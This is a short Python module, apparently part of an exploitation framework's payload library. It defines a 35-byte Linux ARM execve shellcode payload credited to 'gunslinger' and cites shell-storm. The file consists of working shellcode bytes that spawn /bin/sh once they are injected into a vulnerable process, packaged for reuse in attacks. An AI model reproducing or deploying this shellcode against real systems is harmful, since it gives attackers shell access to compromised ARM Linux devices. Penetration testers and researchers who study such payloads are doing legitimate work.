from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "gunslinger"
    Shellcode.info["name"] = "LinuxARM - execve shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-855.php"
    ]
    Shellcode.info["size"] = 35
    Shellcode.info["payload"] = [
        r"\x01\x60\x8f\xe2\x16\xff\x2f\xe1"   	
        r"\x40\x40\x78\x44\x0c\x30"            	
        r"\x49\x40\x52\x40\x0b\x27"       	
        r"\x01\xdf\x01\x27"       	
        r"\x01\xdf\x2f\x2f"            	
        r"\x62\x69\x6e\x2f"    	
        r"\x2f\x73"            	
        r"\x68"
    ]
